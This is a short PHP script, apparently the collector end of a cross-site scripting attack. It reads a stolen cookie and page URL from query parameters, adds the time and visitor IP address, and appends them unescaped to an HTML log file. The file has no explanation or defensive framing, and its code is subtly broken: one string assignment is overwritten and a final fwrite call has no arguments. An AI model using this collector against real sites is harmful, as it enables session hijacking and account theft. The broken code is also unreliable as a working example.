<?php
  $URL = $_GET[URL];
  $COOKIE = $_GET[Cookie];
  $DATE = date("Y/m/d H:i:s",$_SERVER[REQUEST_TIME]);
  $ADDR = $_SERVER[REMOTE_ADDR];
  $content = "----------------------------------------------<br>";
  $content =  "URL: $URL<br>DATE: $DATE<br>ADDR: $ADDR <br>COOKIE: $COOKIE<br><br>";
  
  $recordFile = fopen("accessRecord.html","a") or die("Cannot open the file");
  fwrite($recordFile,$content);
  fwrite();
?>
